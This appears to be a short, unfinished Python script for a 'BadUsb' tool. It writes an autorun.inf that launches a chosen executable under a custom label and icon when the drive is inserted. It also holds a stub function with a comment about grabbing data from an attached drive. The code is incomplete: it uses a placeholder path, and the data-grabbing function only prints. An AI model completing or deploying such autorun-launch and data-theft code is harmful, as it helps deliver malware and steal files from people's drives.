import shutil

def WriteBadUsb(appName, label, icon, usbName, fileSuffix):
    if icon == None:
        icon = appName + fileSuffix
    #create and write startup file
    f = open("autorun.inf", "w")
    f.write(f"[Autorun]\nOpen={appName}{fileSuffix}\nAction=Start {appName}\nLabel={label}\nIcon={icon}")
    f.close()
    #move file to root usb
    shutil.move("path to file", "C://")

def GrabData():
    print("grabbing data")
    
    #rip info from attached external drive as fast as possible for sharing capabilities

#WriteBadUsb("appname.exe", "testLabel", "icon.ico", "usbname", ".exe")